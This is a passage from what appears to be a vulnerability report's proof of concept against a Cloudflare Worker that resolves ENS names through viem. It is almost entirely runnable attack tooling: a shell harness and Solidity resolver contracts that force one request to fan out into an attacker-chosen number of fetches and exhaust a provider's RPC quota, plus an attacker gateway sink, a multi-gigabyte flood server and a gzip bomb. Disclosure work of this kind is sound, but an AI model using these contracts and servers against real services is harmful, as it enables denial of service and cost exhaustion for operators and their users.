MC=$(forge create src/Multicall3.sol:Multicall3 --rpc-url $ANVIL --private-key $K --broadcast 2>&1 \
      | grep -oE "Deployed to: 0x[0-9a-fA-F]{40}" | awk '{print $3}')
cast rpc anvil_setCode 0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe "$(cast code "$UR" --rpc-url $ANVIL)" --rpc-url $ANVIL >/dev/null 2>&1
cast rpc anvil_setCode 0xca11bde05977b3631167028862be2a173976ca11 "$(cast code "$MC" --rpc-url $ANVIL)" --rpc-url $ANVIL >/dev/null 2>&1

# the worker, from the pinned tree, pointed at the QUOTA'd provider
printf 'SEPOLIA_RPC_URL="%s"\n' "$PROXY" > "$PORTAL/.dev.vars"
cd "$PORTAL"
pnpm exec vite build >/dev/null 2>&1
nohup pnpm exec wrangler dev -c dist/portal_app/wrangler.json --port $WORKER_PORT --ip 127.0.0.1 > "$WORKER_LOG" 2>&1 &
for _ in $(seq 1 40); do curl -s -o /dev/null --max-time 3 "http://127.0.0.1:${WORKER_PORT}/" && break; sleep 3; done
curl -s "$PROXY/__reset" >/dev/null 2>&1

echo "arm: $ARM"

if [ "$ARM" = "subrequest" ]; then
  echo "attacker_urls_array_length: $N_URLS"
  curl -s -o /dev/null -w '' --max-time 120 "http://127.0.0.1:${WORKER_PORT}/og/fan.eth.png" 2>/dev/null
  sleep 2
  HITS=$(curl -s --max-time 5 "$SINK/__count" 2>/dev/null)
  echo "worker_subrequests_in_one_invocation: ${HITS:-0}"
  echo "cloudflare_free_plan_cap: 50"
  echo "cloudflare_paid_plan_cap: 10000"
  if [ "${HITS:-0}" -gt 50 ];   then echo "exceeds_free_plan_subrequest_cap: 1";  else echo "exceeds_free_plan_subrequest_cap: 0";  fi
  if [ "${HITS:-0}" -gt 10000 ]; then echo "exceeds_paid_plan_subrequest_cap: 1"; else echo "exceeds_paid_plan_subrequest_cap: 0"; fi
  grep -ci "too many subrequests" "$WORKER_LOG" 2>/dev/null | sed 's/^/workerd_too_many_subrequests_lines: /'
else
  echo "provider_quota: $QUOTA"
  # 1. baseline: a legitimate request for an unrelated name, on a fresh quota
  curl -s "$PROXY/__reset" >/dev/null 2>&1
  B4=$(curl -s -o /dev/null -w '%{http_code}' --max-time 20 "http://127.0.0.1:${WORKER_PORT}/og/legit.eth.png" 2>/dev/null)
  S_B4=$(curl -s --max-time 5 "$PROXY/__stats" 2>/dev/null)
  echo "legit_request_before_attack_http: ${B4:-000}"
  echo "legit_request_before_attack_provider_calls: $(echo "$S_B4" | python3 -c 'import sys,json;print(json.load(sys.stdin)["used"])' 2>/dev/null)"
  echo "legit_request_before_attack_rejected: $(echo "$S_B4" | python3 -c 'import sys,json;print(json.load(sys.stdin)["rejected"])' 2>/dev/null)"

  # 2. ONE unauthenticated attacker request, on a fresh quota
  curl -s "$PROXY/__reset" >/dev/null 2>&1
  curl -s -o /dev/null --max-time 45 "http://127.0.0.1:${WORKER_PORT}/og/loop.eth.png" 2>/dev/null &
  ATTACK_PID=$!
  wait $ATTACK_PID 2>/dev/null
  sleep 2
  S_AT=$(curl -s --max-time 5 "$PROXY/__stats" 2>/dev/null)
  echo "after_one_attacker_request: $S_AT"
  R_AT=$(echo "$S_AT" | python3 -c 'import sys,json;print(json.load(sys.stdin)["rejected"])' 2>/dev/null)
  echo "$S_AT" | grep -q '"exhausted":true' && echo "provider_quota_exhausted_by_ONE_request: 1" || echo "provider_quota_exhausted_by_ONE_request: 0"

  # 3. THE MEASUREMENT: a legitimate request for an unrelated name, AFTER the attack.
  #    Its own RPC calls are now refused by the provider.
  DUR=$(curl -s -o /dev/null -w '%{http_code}' --max-time 20 "http://127.0.0.1:${WORKER_PORT}/og/legit.eth.png" 2>/dev/null)
  S_AF=$(curl -s --max-time 5 "$PROXY/__stats" 2>/dev/null)
  R_AF=$(echo "$S_AF" | python3 -c 'import sys,json;print(json.load(sys.stdin)["rejected"])' 2>/dev/null)
  echo "legit_request_after_attack_http: ${DUR:-000}"
  echo "legit_request_after_attack_rpc_calls_REFUSED_by_provider: $(( ${R_AF:-0} - ${R_AT:-0} ))"
  if [ "$(( ${R_AF:-0} - ${R_AT:-0} ))" -gt 0 ]; then
    echo "legitimate_user_denied_service: 1"
  else
    echo "legitimate_user_denied_service: 0"
  fi
fi
```

`limits/src/Fanout.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// The attacker's resolver, sized to order.
///
/// viem's ccipRequest (viem 2.52.2, _esm/utils/ccip.js:85-141) loops the ENTIRE urls[]
/// array and `continue`s past any response that is not ok or not hex. So the number of
/// outbound fetches the Worker makes IN A SINGLE INVOCATION is exactly the length of this
/// array — a value the attacker chooses, in their own contract.
contract FanoutResolver {
    error OffchainLookup(
        address sender,
        string[] urls,
        bytes callData,
        bytes4 callbackFunction,
        bytes extraData
    );

    uint256 public immutable count;
    string  private  base;

    constructor(string memory base_, uint256 count_) { base = base_; count = count_; }

    function _u(uint256 v) private pure returns (string memory) {
        if (v == 0) return "0";
        uint256 d; uint256 t = v;
        while (t != 0) { d++; t /= 10; }
        bytes memory b = new bytes(d);
        while (v != 0) { b[--d] = bytes1(uint8(48 + v % 10)); v /= 10; }
        return string(b);
    }

    function _urls() private view returns (string[] memory u) {
        u = new string[](count);
        for (uint256 i = 0; i < count; i++) {
            // each entry is a distinct URL at the attacker's host; {data} makes viem pick GET
            u[i] = string(abi.encodePacked(base, _u(i), "/{data}.json"));
        }
    }

    function getUrls() external view returns (string[] memory) { return _urls(); }

    function resolve(bytes calldata, bytes calldata data) external view returns (bytes memory) {
        revert OffchainLookup(address(this), _urls(), data, this.resolveCallback.selector, "");
    }

    function resolveCallback(bytes calldata r, bytes calldata) external pure returns (bytes memory) { return r; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

/// Same UniversalResolver wildcard pass-through model as the main PoC: catch the
/// resolver's OffchainLookup and re-revert with sender = this and urls[] VERBATIM.
contract PassThroughUR {
    error OffchainLookup(
        address sender, string[] urls, bytes callData, bytes4 callbackFunction, bytes extraData
    );
    address public immutable resolverAddr;
    bytes32 public immutable attackName;   // keccak of the DNS-encoded name under attack

    constructor(address r, bytes memory attackDnsName) {
        resolverAddr = r;
        attackName = keccak256(attackDnsName);
    }

    /// Only the name under attack fans out. EVERY OTHER NAME resolves normally and
    /// cheaply, so a request for an unrelated name is a genuinely LEGITIMATE request and
    /// its failure means something.
    function _benign() private pure returns (bytes memory) {
        bytes[] memory empty = new bytes[](0);
        return abi.encode(empty);
    }

    function _pt(bytes calldata name, bytes calldata data) private view {
        (bool ok, bytes memory ret) =
            resolverAddr.staticcall(abi.encodeWithSignature("resolve(bytes,bytes)", name, data));
        require(!ok, "expected OffchainLookup");
        // word-wise copy of the revert payload past its 4-byte selector. The naive
        // byte-at-a-time loop is O(n) with a large constant and runs the eth_call out of
        // gas well before the array sizes that matter here.
        bytes memory payload;
        assembly {
            let len := sub(mload(ret), 4)
            payload := mload(0x40)
            mstore(payload, len)
            let src := add(ret, 0x24)
            let dst := add(payload, 0x20)
            for { let i := 0 } lt(i, len) { i := add(i, 0x20) } {
                mstore(add(dst, i), mload(add(src, i)))
            }
            mstore(0x40, add(dst, and(add(len, 0x1f), not(0x1f))))
        }
        (, string[] memory urls, bytes memory cd, bytes4 cb, bytes memory extra) =
            abi.decode(payload, (address, string[], bytes, bytes4, bytes));
        revert OffchainLookup(address(this), urls, cd, cb, extra);
    }

    function resolve(bytes calldata n, bytes calldata d) external view returns (bytes memory, address) {
        if (keccak256(n) != attackName) return (_benign(), resolverAddr);
        _pt(n, d);
    }
    function resolveWithGateways(bytes calldata n, bytes calldata d, string[] calldata)
        external view returns (bytes memory, address) {
        if (keccak256(n) != attackName) return (_benign(), resolverAddr);
        _pt(n, d);
    }
    function resolveCallback(bytes calldata r, bytes calldata) external pure returns (bytes memory, address) { return (r, address(0)); }
}
```

`limits/sink.mjs`:

```js
// The attacker's gateway host. Answers 200 with a NON-HEX body so viem's ccipRequest
// treats it as malformed and `continue`s to the next url — which is what makes the worker
// walk the whole attacker-supplied array in ONE invocation.
// Counts every hit, so the count IS the worker's subrequest count for that invocation.
import http from 'node:http'
let hits = 0
http.createServer((req, res) => {
  if (req.url === '/__count') {
    res.writeHead(200, { 'content-type': 'text/plain' })
    return res.end(String(hits))
  }
  hits++
  res.writeHead(200, { 'content-type': 'text/plain' })
  res.end('not-hex')
}).listen(9111, '127.0.0.1', () => console.log('sink on 9111'))
```

`limits/quota-proxy.mjs`:

```js
// An RPC endpoint with a QUOTA, standing in for the keyed provider behind SEPOLIA_RPC_URL.
// Every real provider tier enforces one; this makes the consequence observable locally
// instead of inferred. Over quota -> HTTP 429, which is what a provider actually returns.
import http from 'node:http'
const UPSTREAM = process.env.UPSTREAM ?? 'http://127.0.0.1:8555'
const QUOTA = Number(process.env.QUOTA ?? 500)
let used = 0, rejected = 0
http.createServer(async (req, res) => {
  if (req.url === '/__stats') {
    res.writeHead(200, { 'content-type': 'application/json' })
    return res.end(JSON.stringify({ used, rejected, quota: QUOTA, exhausted: used >= QUOTA }))
  }
  if (req.url === '/__reset') { used = 0; rejected = 0; res.writeHead(200); return res.end('ok') }

  const chunks = []
  for await (const c of req) chunks.push(c)
  const body = Buffer.concat(chunks)

  if (used >= QUOTA) {
    rejected++
    res.writeHead(429, { 'content-type': 'application/json' })
    return res.end(JSON.stringify({ error: { code: -32005, message: 'quota exceeded' } }))
  }
  used++
  try {
    const up = await fetch(UPSTREAM, { method: 'POST', headers: { 'content-type': 'application/json' }, body })
    const text = await up.text()
    res.writeHead(up.status, { 'content-type': 'application/json' })
    res.end(text)
  } catch (e) {
    res.writeHead(502, { 'content-type': 'application/json' })
    res.end(JSON.stringify({ error: { message: String(e) } }))
  }
}).listen(9222, '127.0.0.1', () => console.log(`quota proxy on 9222 (quota=${QUOTA})`))
```

#### The withdrawn memory-exhaustion arm

Included so the negative result is reproducible too. These produced the figures in the Impact Details section showing that the isolate does **not** die: a multi-gigabyte plain stream and a gzip bomb both returned HTTP 200 with flat RSS.

`flood.mjs`:

```js
// Instrumented flood: valid JSON framing so .json() must buffer the WHOLE body,
// and a byte counter so we know what actually left the server.
import http from 'node:http'
import { appendFileSync, writeFileSync } from 'node:fs'
const OUT = '/tmp/h-c7-6-flood.txt'
writeFileSync(OUT, '')
const TARGET_MB = Number(process.env.FLOOD_MB ?? 2048)
http.createServer((req, res) => {
  appendFileSync(OUT, `HIT ${req.method} ${req.url.slice(0, 80)}\n`)
  res.writeHead(200, { 'content-type': 'application/json' })
  const chunk = Buffer.alloc(1 << 20, 0x41)          // 1 MiB of 'A'
  let mb = 0
  res.write('{"data":"0x')
  const pump = () => {
    while (mb < TARGET_MB) {
      mb++
      if (!res.write(chunk)) return res.once('drain', pump)
    }
    res.end('"}')
    appendFileSync(OUT, `SENT ${mb} MiB\n`)
  }
  res.on('close', () => appendFileSync(OUT, `CLOSED after ${mb} MiB\n`))
  pump()
}).listen(9099, '127.0.0.1', () => console.log('flood server on 9099'))
```

`gzipbomb.mjs`:

```js
// gzip bomb: tiny on the wire, huge decoded. workerd decompresses transparently.
import http from 'node:http'
import { gzipSync } from 'node:zlib'
import { appendFileSync, writeFileSync } from 'node:fs'
const OUT = '/tmp/h-c7-6-gzip.txt'
writeFileSync(OUT, '')
const MB = Number(process.env.GZIP_MB ?? 4096)
// build once: '{"data":"0x' + MB MiB of 'A' + '"}'  then gzip it
const body = Buffer.concat([
  Buffer.from('{"data":"0x'),
  Buffer.alloc(MB * (1 << 20), 0x41),
  Buffer.from('"}'),
])
const gz = gzipSync(body, { level: 9 })
appendFileSync(OUT, `prepared: decoded=${(body.length / 1048576).toFixed(1)} MiB  wire=${(gz.length / 1048576).toFixed(2)} MiB  ratio=${(body.length / gz.length).toFixed(0)}x\n`)
http.createServer((req, res) => {
  appendFileSync(OUT, `HIT ${req.url.slice(0, 60)}\n`)
  res.writeHead(200, { 'content-type': 'application/json', 'content-encoding': 'gzip' })
  res.end(gz)
  appendFileSync(OUT, `SENT ${(gz.length / 1048576).toFixed(2)} MiB on the wire\n`)
}).listen(9099, '127.0.0.1', () => console.log('gzip bomb server on 9099'))
```
